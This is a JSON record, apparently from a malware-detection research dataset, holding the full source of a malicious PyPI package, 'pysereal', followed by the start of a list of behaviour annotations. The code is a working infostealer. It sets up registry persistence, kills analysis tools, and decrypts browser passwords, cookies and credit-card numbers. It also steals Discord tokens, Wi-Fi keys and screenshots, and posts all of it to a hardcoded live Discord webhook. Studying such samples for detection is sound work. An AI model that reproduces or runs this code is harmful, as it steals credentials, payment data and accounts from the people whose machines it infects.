{
  "metadata": {
    "package_name": "pysereal-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/pysereal-0.0.9-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "sereal.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pysereal-0.0.9-py3-none-any/sereal/sereal.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport re\nimport subprocess\nimport sys\nimport uuid\nimport psutil\nimport requests\nfrom typing import Literal\nimport shutil\nimport ctypes\nimport wmi\nfrom discord import Embed, File, SyncWebhook\nfrom PIL import ImageGrab\nimport time\nimport base64\nimport json\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nimport sqlite3\nfrom pathlib import Path\nfrom zipfile import ZipFile\n\n__LOGINS__ = []\n__COOKIES__ = []\n__WEB_HISTORY__ = []\n__DOWNLOADS__ = []\n__CARDS__ = []\n\n# --- Startup persistence ---\nclass Startup:\n    def __init__(self) -> None:\n        self.working_dir = os.getenv(\"APPDATA\") + \"\\\\empyrean\"\n\n        if self.check_self():\n            return\n\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n\n    def check_self(self) -> bool:\n        if os.path.realpath(sys.executable) == self.working_dir + \"\\\\dat.txt\":\n            return True\n        return False\n\n    def mkdir(self) -> str:\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n\n    def write_stub(self) -> None:\n        shutil.copy2(os.path.realpath(sys.executable),\n                    self.working_dir + \"\\\\dat.txt\")\n        with open(file=f\"{self.working_dir}\\\\run.bat\", mode=\"w\") as f:\n            f.write(f\"@echo off\\ncall {self.working_dir}\\\\dat.txt\")\n\n    def regedit(self) -> None:\n        subprocess.run(args=[\n                    \"reg\", \"delete\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"/v\", \"empyrean\", \"/f\"], shell=True)\n        subprocess.run(args=[\"reg\", \"add\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n                    \"/v\", \"empyrean\", \"/t\", \"REG_SZ\", \"/d\", f\"{self.working_dir}\\\\run.bat\", \"/f\"], shell=True)\n\n# --- Anti-debugging and anti-analysis ---\nclass AntiDebug:\n    def __init__(self) -> None:\n        if self.checks():\n            sys.exit(int())\n\n    def checks(self) -> bool:\n        debugging = False\n        self.blackListedUsers = [...]\n        self.blackListedPCNames = [...]\n        self.blackListedHWIDS = [...]\n        self.blackListedIPS = [...]\n        self.blackListedMacs = [...]\n        self.blacklistedProcesses = [...]\n        self.check_process()\n        if self.get_network():\n            debugging = True\n        if self.get_system():\n            debugging = True\n        return debugging\n\n    def check_process(self) -> None:\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n\n    def get_network(self) -> Literal[True] | None:\n        ip = requests.get('https://ipapi.co/ip/').text\n        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))\n        if ip in self.blackListedIPS:\n            return True\n        if mac in self.blackListedMacs:\n            return True\n\n    def get_system(self) -> Literal[True] | None:\n        try:\n            hwid = subprocess.check_output('C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe csproduct get uuid', shell=True,\n                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\\n')[1].strip()\n        except:\n            hwid = \"None\"\n        username = os.getenv(\"UserName\")\n        hostname = os.getenv(\"COMPUTERNAME\")\n        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):\n            if hwid in i or username in i or hostname in i:\n                return True\n\n# --- System info and screenshot exfiltration ---\nclass SystemInfo():\n    def __init__(self, webhook: str) -> None:\n        webhook = SyncWebhook.from_url(webhook)\n        embed = Embed(title=\"System Information\", color=0x000000)\n        embed.add_field(\n            name=self.user_data()[0],\n            value=self.user_data()[1],\n            inline=self.user_data()[2]\n        )\n        embed.add_field(\n            name=self.system_data()[0],\n            value=self.system_data()[1],\n            inline=self.system_data()[2]\n        )\n        embed.add_field(\n            name=self.disk_data()[0],\n            value=self.disk_data()[1],\n            inline=self.disk_data()[2]\n        )\n        embed.add_field(\n            name=self.network_data()[0],\n            value=self.network_data()[1],\n            inline=self.network_data()[2]\n        )\n        embed.add_field(\n            name=self.wifi_data()[0],\n            value=self.wifi_data()[1],\n            inline=self.wifi_data()[2]\n        )\n        image = ImageGrab.grab(\n            bbox=None,\n            include_layered_windows=False,\n            all_screens=True,\n            xdisplay=None\n        )\n        image.save(\"screenshot.png\")\n        embed.set_image(url=\"attachment://screenshot.png\")\n        try:\n            webhook.send(\n                embed=embed,\n                file=File('.\\\\screenshot.png', filename='screenshot.png'),\n                username=\"Empyrean\",\n                avatar_url=\"https://i.imgur.com/HjzfjfR.png\"\n            )\n        except:\n            pass\n        if os.path.exists(\"screenshot.png\"):\n            os.remove(\"screenshot.png\")\n    def user_data(self) -> tuple[str, str, bool]:\n        def display_name() -> str:\n            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW\n            NameDisplay = 3\n            size = ctypes.pointer(ctypes.c_ulong(0))\n            GetUserNameEx(NameDisplay, None, size)\n            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)\n            GetUserNameEx(NameDisplay, nameBuffer, size)\n            return nameBuffer.value\n        display_name = display_name()\n        hostname = os.getenv('COMPUTERNAME')\n        username = os.getenv('USERNAME')\n        return (\n            \":bust_in_silhouette: User\",\n            f\"```Display Name: {display_name}\\nHostname: {hostname}\\nUsername: {username}```\",\n            False\n        )\n    def system_data(self) -> tuple[str, str, bool]:\n        def get_hwid() -> str:\n            try:\n                hwid = subprocess.check_output('C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe csproduct get uuid', shell=True,\n                                            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\\n')[1].strip()\n            except:\n                hwid = \"None\"\n            return hwid\n        cpu = wmi.WMI().Win32_Processor()[0].Name\n        gpu = wmi.WMI().Win32_VideoController()[0].Name\n        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)\n        hwid = get_hwid()\n        return (\n            \"<:CPU:1004131852208066701> System\",\n            f\"```CPU: {cpu}\\nGPU: {gpu}\\nRAM: {ram}\\nHWID: {hwid}```\",\n            False\n        )\n    def disk_data(self) -> tuple[str, str, bool]:\n        disk = (\"{:<9} \"*4).format(\"Drive\", \"Free\", \"Total\", \"Use%\") + \"\\n\"\n        for part in psutil.disk_partitions(all=False):\n            if os.name == 'nt':\n                if 'cdrom' in part.opts or part.fstype == '':\n                    continue\n            usage = psutil.disk_usage(part.mountpoint)\n            disk += (\"{:<9} \"*4).format(part.device, str(\n                usage.free // (2**30)) + \"GB\", str(usage.total // (2**30)) + \"GB\", str(usage.percent) + \"%\") + \"\\n\"\n        return (\n            \":floppy_disk: Disk\",\n            f\"```{disk}```\",\n            False\n        )\n    def network_data(self) -> tuple[str, str, bool]:\n        def geolocation(ip: str) -> str:\n            url = f\"https://ipapi.co/{ip}/json/\"\n            response = requests.get(url, headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"})\n            data = response.json()\n            return (data[\"country\"], data[\"region\"], data[\"city\"], data[\"postal\"], data[\"asn\"])\n        ip = requests.get(\n            \"https://www.cloudflare.com/cdn-cgi/trace\").text.split(\"ip=\")[1].split(\"\\n\")[0]\n        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))\n        country, region, city, zip_, as_ = geolocation(ip)\n        return (\n            \":satellite: Network\",\n            \"```IP Address: {ip}\\nMAC Address: {mac}\\nCountry: {country}\\nRegion: {region}\\nCity: {city} ({zip_})\\nISP: {as_}```\".format(\n                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),\n            False\n        )\n    def wifi_data(self) -> tuple[str, str, bool]:\n        networks, out = [], ''\n        try:\n            wifi = subprocess.check_output(\n                ['netsh', 'wlan', 'show', 'profiles'], shell=True,\n                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\\n')\n            wifi = [i.split(\":\")[1][1:-1]\n                    for i in wifi if \"All User Profile\" in i]\n            for name in wifi:\n                try:\n                    results = subprocess.check_output(\n                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,\n                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\\n')\n                    results = [b.split(\":\")[1][1:-1]\n                            for b in results if \"Key Content\" in b]\n                except subprocess.CalledProcessError:\n                    networks.append((name, ''))\n                    continue\n                try:\n                    networks.append((name, results[0]))\n                except IndexError:\n                    networks.append((name, ''))\n        except subprocess.CalledProcessError:\n            pass\n        except UnicodeDecodeError:\n            pass\n        out += f'{\"SSID\":<20}| {\"PASSWORD\":<}\\n'\n        out += f'{\"-\"*20}|{\"-\"*29}\\n'\n        for name, password in networks:\n            out += '{:<20}| {:<}\\n'.format(name, password)\n        return (\n            \":signal_strength: WiFi\",\n            f\"```{out}```\",\n            False\n        )\n\n# --- Discord token stealer ---\nclass DiscordToken:\n    def __init__(self, webhook):\n        upload_tokens(webhook).upload()\n\nclass extract_tokens:\n    def __init__(self) -> None:\n        self.base_url = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.regexp = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.regexp_enc = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens, self.uids = [], []\n        self.extract()\n    def extract(self) -> None:\n        paths = {...}\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            _discord = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if not os.path.exists(self.roaming + f\"\\\\{_discord}\\\\Local State\"):\n                    continue\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [\n                        x.strip()\n                        for x in open(\n                            f\"{path}\\\\{file_name}\", errors=\"ignore\"\n                        ).readlines()\n                        if x.strip()\n                    ]:\n                        for y in re.findall(self.regexp_enc, line):\n                            token = self.decrypt_val(\n                                base64.b64decode(y.split(\"dQw4w9WgXcQ:\")[1]),\n                                self.get_master_key(\n                                    self.roaming + f\"\\\\{_discord}\\\\Local State\"\n                                ),\n                            )\n                            if self.validate_token(token):\n                                uid = requests.get(\n                                    self.base_url, headers={\"Authorization\": token}\n                                ).json()[\"id\"]\n                                if uid not in self.uids:\n                                    self.tokens.append(token)\n                                    self.uids.append(uid)\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [\n                        x.strip()\n                        for x in open(\n                            f\"{path}\\\\{file_name}\", errors=\"ignore\"\n                        ).readlines()\n                        if x.strip()\n                    ]:\n                        for token in re.findall(self.regexp, line):\n                            if self.validate_token(token):\n                                uid = requests.get(\n                                    self.base_url, headers={\"Authorization\": token}\n                                ).json()[\"id\"]\n                                if uid not in self.uids:\n                                    self.tokens.append(token)\n                                    self.uids.append(uid)\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(\n                self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"\n            ):\n                for _file in files:\n                    if not _file.endswith(\".sqlite\"):\n                        continue\n                    for line in [\n                        x.strip()\n                        for x in open(f\"{path}\\\\{_file}\", errors=\"ignore\").readlines()\n                        if x.strip()\n                    ]:\n                        for token in re.findall(self.regexp, line):\n                            if self.validate_token(token):\n                                uid = requests.get(\n                                    self.base_url, headers={\"Authorization\": token}\n                                ).json()[\"id\"]\n                                if uid not in self.uids:\n                                    self.tokens.append(token)\n                                    self.uids.append(uid)\n    def validate_token(self, token: str) -> bool:\n        r = requests.get(self.base_url, headers={\"Authorization\": token})\n        if r.status_code == 200:\n            return True\n        return False\n    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n    def get_master_key(self, path: str) -> str:\n        if not os.path.exists(path):\n            return\n        if \"os_crypt\" not in open(path, \"r\", encoding=\"utf-8\").read():\n            return\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\nclass upload_tokens:\n    def __init__(self, webhook: str):\n        self.tokens = extract_tokens().tokens\n        self.webhook = SyncWebhook.from_url(webhook)\n    def calc_flags(self, flags: int) -> list:\n        flags_dict = {...}\n        return [\n            [flags_dict[flag][\"emoji\"], flags_dict[flag][\"ind\"]]\n            for flag in flags_dict\n            if int(flags) & (1 << flags_dict[flag][\"shift\"])\n        ]\n    def upload(self):\n        if not self.tokens:\n            return\n        for token in self.tokens:\n            user = requests.get(\n                \"https://discord.com/api/v8/users/@me\", headers={\"Authorization\": token}\n            ).json()\n            billing = requests.get(\n                \"https://discord.com/api/v6/users/@me/billing/payment-sources\",\n                headers={\"Authorization\": token},\n            ).json()\n            guilds = requests.get(\n                \"https://discord.com/api/v9/users/@me/guilds?with_counts=true\",\n                headers={\"Authorization\": token},\n            ).json()\n            friends = requests.get(\n                \"https://discord.com/api/v8/users/@me/relationships\",\n                headers={\"Authorization\": token},\n            ).json()\n            gift_codes = requests.get(\n                \"https://discord.com/api/v9/users/@me/outbound-promotions/codes\",\n                headers={\"Authorization\": token},\n            ).json()\n            username = user[\"username\"] + \"#\" + user[\"discriminator\"]\n            user_id = user[\"id\"]\n            email = user[\"email\"]\n            phone = user[\"phone\"]\n            mfa = user[\"mfa_enabled\"]\n            avatar = (\n                f\"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif\"\n                if requests.get(\n                    f\"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif\"\n                ).status_code\n                == 200\n                else f\"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png\"\n            )\n            badges = \" \".join(\n                [flag[0] for flag in self.calc_flags(user[\"public_flags\"])]\n            )\n            if user[\"premium_type\"] == 0:\n                nitro = \"None\"\n            elif user[\"premium_type\"] == 1:\n                nitro = \"Nitro Classic\"\n            elif user[\"premium_type\"] == 2:\n                nitro = \"Nitro\"\n            elif user[\"premium_type\"] == 3:\n                nitro = \"Nitro Basic\"\n            else:\n                nitro = \"None\"\n            if billing:\n                payment_methods = []\n                for method in billing:\n                    if method[\"type\"] == 1:\n                        payment_methods.append(\"\")\n                    elif method[\"type\"] == 2:\n                        payment_methods.append(\"<:paypal:973417655627288666>\")\n                    else:\n                        payment_methods.append(\"â“\")\n                payment_methods = \", \".join(payment_methods)\n            else:\n                payment_methods = None\n            if guilds:\n                hq_guilds = []\n                for guild in guilds:\n                    admin = True if guild[\"permissions\"] == \"4398046511103\" else False\n                    if admin and guild[\"approximate_member_count\"] >= 100:\n                        owner = \"âœ…\" if guild[\"owner\"] else \"âŒ\"\n                        invites = requests.get(\n                            f\"https://discord.com/api/v8/guilds/{guild['id']}/invites\",\n                            headers={\"Authorization\": token},\n                        ).json()\n                        if len(invites) > 0:\n                            invite = f\"https://discord.gg/{invites[0]['code']}\"\n                        else:\n                            invite = \"https://youtu.be/dQw4w9WgXcQ\"\n                        data = f\"\\u200b\\n**{guild['name']} ({guild['id']})** \\n Owner: `{owner}` | Members: ` âš« {guild['approximate_member_count']} / ðŸŸ¢ {guild['approximate_presence_count']} / ðŸ”´ {guild['approximate_member_count'] - guild['approximate_presence_count']} `\\n[Join Server]({invite})\"\n                        if len(\"\\n\".join(hq_guilds)) + len(data) >= 1024:\n                            break\n                        hq_guilds.append(data)\n                if len(hq_guilds) > 0:\n                    hq_guilds = \"\\n\".join(hq_guilds)\n                else:\n                    hq_guilds = None\n            else:\n                hq_guilds = None\n            if friends:\n                hq_friends = []\n                for friend in friends:\n                    unprefered_flags = [64, 128, 256, 1048704]\n                    inds = [\n                        flag[1]\n                        for flag in self.calc_flags(friend[\"user\"][\"public_flags\"])[::-1]\n                    ]\n                    for flag in unprefered_flags:\n                        inds.remove(flag) if flag in inds else None\n                    if inds != []:\n                        hq_badges = \" \".join(\n                            [\n                                flag[0]\n                                for flag in self.calc_flags(\n                                    friend[\"user\"][\"public_flags\"]\n                                )[:: -1]\n                            ]\n                        )\n                        data = f\"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\"\n                        if len(\"\\n\".join(hq_friends)) + len(data) >= 1024:\n                            break\n                        hq_friends.append(data)\n                if len(hq_friends) > 0:\n                    hq_friends = \"\\n\".join(hq_friends)\n                else:\n                    hq_friends = None\n            else:\n                hq_friends = None\n            if gift_codes:\n                codes = []\n                for code in gift_codes:\n                    name = code[\"promotion\"][\"outbound_title\"]\n                    code = code[\"code\"]\n                    data = f\":gift: `{name}`\\n:ticket: `{code}`\"\n                    if len(\"\\n\\n\".join(codes)) + len(data) >= 1024:\n                        break\n                    codes.append(data)\n                if len(codes) > 0:\n                    codes = \"\\n\\n\".join(codes)\n                else:\n                    codes = None\n            else:\n                codes = None\n            embed = Embed(title=f\"{username} ({user_id})\", color=0x000000)\n            embed.set_thumbnail(url=avatar)\n            embed.add_field(\n                name=\"<a:pinkcrown:996004209667346442> Token:\",\n                value=f\"```{token}```\\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\\n\\u200b\",\n                inline=False,\n            )\n            embed.add_field(\n                name=\"<a:nitroboost:996004213354139658> Nitro:\",\n                value=f\"{nitro}\",\n                inline=True,\n            )\n            embed.add_field(\n                name=\"<a:redboost:996004230345281546> Badges:\",\n                value=f\"{badges if badges != '' else 'None'}\",\n                inline=True,\n            )\n            embed.add_field(\n                name=\"<a:pinklv:996004222090891366> Billing:\",\n                value=f\"{payment_methods if payment_methods != '' else 'None'}\",\n                inline=True,\n            )\n            embed.add_field(\n                name=\"<:mfa:1021604916537602088> MFA:\", value=f\"{mfa}\", inline=True\n            )\n            embed.add_field(name=\"\\u200b\", value=\"\\u200b\", inline=False)\n            embed.add_field(\n                name=\"<a:rainbowheart:996004226092245072> Email:\",\n                value=f\"{email if email != None else 'None'}\",\n                inline=True,\n            )\n            embed.add_field(\n                name=\"<:starxglow:996004217699434496> Phone:\",\n                value=f\"{phone if phone != None else 'None'}\",\n                inline=True,\n            )\n            embed.add_field(name=\"\\u200b\", value=\"\\u200b\", inline=False)\n            if hq_guilds != None:\n                embed.add_field(\n                    name=\"<a:earthpink:996004236531859588> HQ Guilds:\",\n                    value=hq_guilds,\n                    inline=False,\n                )\n                embed.add_field(name=\"\\u200b\", value=\"\\u200b\", inline=False)\n            if hq_friends != None:\n                embed.add_field(\n                    name=\"<a:earthpink:996004236531859588> HQ Friends:\",\n                    value=hq_friends,\n                    inline=False,\n                )\n                embed.add_field(name=\"\\u200b\", value=\"\\u200b\", inline=False)\n            if codes != None:\n                embed.add_field(\n                    name=\"<a:gift:1021608479808569435> Gift Codes:\",\n                    value=codes,\n                    inline=False,\n                )\n                embed.add_field(name=\"\\u200b\", value=\"\\u200b\", inline=False)\n            embed.set_footer(text=\"github.com/addi00000/empyrean\")\n            self.webhook.send(\n                embed=embed,\n                username=\"Empyrean\",\n                avatar_url=\"https://i.imgur.com/HjzfjfR.png\",\n            )\n\n# --- Chromium browser data stealer ---\nclass Browsers:\n    def __init__(self, webhook):\n        self.webhook = SyncWebhook.from_url(webhook)\n        Chromium()\n        Upload(self.webhook)\n\nclass Upload:\n    def __init__(self, webhook: SyncWebhook):\n        self.webhook = webhook\n        self.write_files()\n        self.send()\n        self.clean()\n    def write_files(self):\n        os.makedirs(\"vault\", exist_ok=True)\n        if __LOGINS__:\n            with open(\"vault\\\\logins.txt\", \"w\", encoding=\"utf-8\") as f:\n                f.write('\\n'.join(str(x) for x in __LOGINS__))\n        if __COOKIES__:\n            with open(\"vault\\\\cookies.txt\", \"w\", encoding=\"utf-8\") as f:\n                f.write('\\n'.join(str(x) for x in __COOKIES__))\n        if __WEB_HISTORY__:\n            with open(\"vault\\\\web_history.txt\", \"w\", encoding=\"utf-8\") as f:\n                f.write('\\n'.join(str(x) for x in __WEB_HISTORY__))\n        if __DOWNLOADS__:\n            with open(\"vault\\\\downloads.txt\", \"w\", encoding=\"utf-8\") as f:\n                f.write('\\n'.join(str(x) for x in __DOWNLOADS__))\n        if __CARDS__:\n            with open(\"vault\\\\cards.txt\", \"w\", encoding=\"utf-8\") as f:\n                f.write('\\n'.join(str(x) for x in __CARDS__))\n        with ZipFile(\"vault.zip\", \"w\") as zip:\n            for file in os.listdir(\"vault\"):\n                zip.write(f\"vault\\\\{file}\", file)\n    def send(self):\n        self.webhook.send(\n            embed=Embed(\n                title=\"Vault\",\n                description=\"```\" +\n                '\\n'.join(self.tree(Path(\"vault\"))) + \"```\",\n            ),\n            file=File(\"vault.zip\"),\n            username=\"Empyrean\",\n            avatar_url=\"https://i.imgur.com/HjzfjfR.png\"\n        )\n    def clean(self):\n        shutil.rmtree(\"vault\")\n        os.remove(\"vault.zip\")\n    def tree(self, path: Path, prefix: str = '', midfix_folder: str = 'ðŸ“‚ - ', midfix_file: str = 'ðŸ“„ - '):\n        pipes = {\n            'space':  '    ',\n            'branch': 'â”‚   ',\n            'tee':    'â”œâ”€â”€ ',\n            'last':   'â””â”€â”€ ',\n        }\n        if prefix == '':\n            yield midfix_folder + path.name\n        contents = list(path.iterdir())\n        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]\n        for pointer, path in zip(pointers, contents):\n            if path.is_dir():\n                yield f\"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)\"\n                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']\n                yield from self.tree(path, prefix=prefix+extension)\n            else:\n                yield f\"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)\"\n\nclass Chromium:\n    def __init__(self):\n        self.appdata = os.getenv('LOCALAPPDATA')\n        self.browsers = {...}\n        self.profiles = [\n            'Default',\n            'Profile 1',\n            'Profile 2',\n            'Profile 3',\n            'Profile 4',\n            'Profile 5',\n        ]\n        for _, path in self.browsers.items():\n            if not os.path.exists(path):\n                continue\n            self.master_key = self.get_master_key(f'{path}\\\\Local State')\n            if not self.master_key:\n                continue\n            for profile in self.profiles:\n                if not os.path.exists(path + '\\\\' + profile):\n                    continue\n                operations = [\n                    self.get_login_data,\n                    self.get_cookies,\n                    self.get_web_history,\n                    self.get_downloads,\n                    self.get_credit_cards,\n                ]\n                for operation in operations:\n                    try:\n                        operation(path, profile)\n                    except Exception as e:\n                        pass\n    def get_master_key(self, path: str) -> str:\n        if not os.path.exists(path):\n            return\n        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():\n            return\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n    def get_login_data(self, path: str, profile: str):\n        login_db = f'{path}\\\\{profile}\\\\Login Data'\n        if not os.path.exists(login_db):\n            return\n        shutil.copy(login_db, 'login_db')\n        conn = sqlite3.connect('login_db')\n        cursor = conn.cursor()\n        cursor.execute(\n            'SELECT action_url, username_value, password_value FROM logins')\n        for row in cursor.fetchall():\n            if not row[0] or not row[1] or not row[2]:\n                continue\n            password = self.decrypt_password(row[2], self.master_key)\n            __LOGINS__.append(Types.Login(row[0], row[1], password))\n        conn.close()\n        os.remove('login_db')\n    def get_cookies(self, path: str, profile: str):\n        cookie_db = f'{path}\\\\{profile}\\\\Network\\\\Cookies'\n        if not os.path.exists(cookie_db):\n            return\n        try:\n            shutil.copy(cookie_db, 'cookie_db')\n            conn = sqlite3.connect('cookie_db')\n            cursor = conn.cursor()\n            cursor.execute(\n                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')\n            for row in cursor.fetchall():\n                if not row[0] or not row[1] or not row[2] or not row[3]:\n                    continue\n                cookie = self.decrypt_password(row[3], self.master_key)\n                __COOKIES__.append(Types.Cookie(\n                    row[0], row[1], row[2], cookie, row[4]))\n            conn.close()\n        except Exception as e:\n            pass\n        os.remove('cookie_db')\n    def get_web_history(self, path: str, profile: str):\n        web_history_db = f'{path}\\\\{profile}\\\\History'\n        if not os.path.exists(web_history_db):\n            return\n        shutil.copy(web_history_db, 'web_history_db')\n        conn = sqlite3.connect('web_history_db')\n        cursor = conn.cursor()\n        cursor.execute('SELECT url, title, last_visit_time FROM urls')\n        for row in cursor.fetchall():\n            if not row[0] or not row[1] or not row[2]:\n                continue\n            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))\n        conn.close()\n        os.remove('web_history_db')\n    def get_downloads(self, path: str, profile: str):\n        downloads_db = f'{path}\\\\{profile}\\\\History'\n        if not os.path.exists(downloads_db):\n            return\n        shutil.copy(downloads_db, 'downloads_db')\n        conn = sqlite3.connect('downloads_db')\n        cursor = conn.cursor()\n        cursor.execute('SELECT tab_url, target_path FROM downloads')\n        for row in cursor.fetchall():\n            if not row[0] or not row[1]:\n                continue\n            __DOWNLOADS__.append(Types.Download(row[0], row[1]))\n        conn.close()\n        os.remove('downloads_db')\n    def get_credit_cards(self, path: str, profile: str):\n        cards_db = f'{path}\\\\{profile}\\\\Web Data'\n        if not os.path.exists(cards_db):\n            return\n        shutil.copy(cards_db, 'cards_db')\n        conn = sqlite3.connect('cards_db')\n        cursor = conn.cursor()\n        cursor.execute(\n            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')\n        for row in cursor.fetchall():\n            if not row[0] or not row[1] or not row[2] or not row[3]:\n                continue\n            card_number = self.decrypt_password(row[3], self.master_key)\n            __CARDS__.append(Types.CreditCard(\n                row[0], row[1], row[2], card_number, row[4]))\n        conn.close()\n        os.remove('cards_db')\n\nclass Types:\n    class Login:\n        def __init__(self, url, username, password):\n            self.url = url\n            self.username = username\n            self.password = password\n        def __str__(self):\n            return f'{self.url}\\t{self.username}\\t{self.password}'\n        def __repr__(self):\n            return self.__str__()\n    class Cookie:\n        def __init__(self, host, name, path, value, expires):\n            self.host = host\n            self.name = name\n            self.path = path\n            self.value = value\n            self.expires = expires\n        def __str__(self):\n            return f'{self.host}\\t{\"FALSE\" if self.expires == 0 else \"TRUE\"}\\t{self.path}\\t{\"FALSE\" if self.host.startswith(\".\") else \"TRUE\"}\\t{self.expires}\\t{self.name}\\t{self.value}'\n        def __repr__(self):\n            return self.__str__()\n    class WebHistory:\n        def __init__(self, url, title, timestamp):\n            self.url = url\n            self.title = title\n            self.timestamp = timestamp\n        def __str__(self):\n            return f'{self.url}\\t{self.title}\\t{self.timestamp}'\n        def __repr__(self):\n            return self.__str__()\n    class Download:\n        def __init__(self, tab_url, target_path):\n            self.tab_url = tab_url\n            self.target_path = target_path\n        def __str__(self):\n            return f'{self.tab_url}\\t{self.target_path}'\n        def __repr__(self):\n            return self.__str__()\n    class CreditCard:\n        def __init__(self, name, month, year, number, date_modified):\n            self.name = name\n            self.month = month\n            self.year = year\n            self.number = number\n            self.date_modified = date_modified\n        def __str__(self):\n            return f'{self.name}\\t{self.month}\\t{self.year}\\t{self.number}\\t{self.date_modified}'\n        def __repr__(self):\n            return self.__str__()\n\n# --- Entrypoint ---\ndef setup_serial():\n    webhook = \"https://discord.com/api/webhooks/1174217638638006272/1omvStEFdCkl0VH64xcueL1I_3OsAIvtXSBhCCDQOEEsgzctNhtNU2xTNzfNDlYCC6YY\"\n    AntiDebug()\n    Browsers(webhook)\n    DiscordToken(webhook)\n    #Startup()  # commented, but present\n    SystemInfo(webhook)\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"APPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.realpath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "sys.executable",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Prepare_executable_string",
              "intention_id": "prepare_executable_string"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "self.working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.mkdir()",
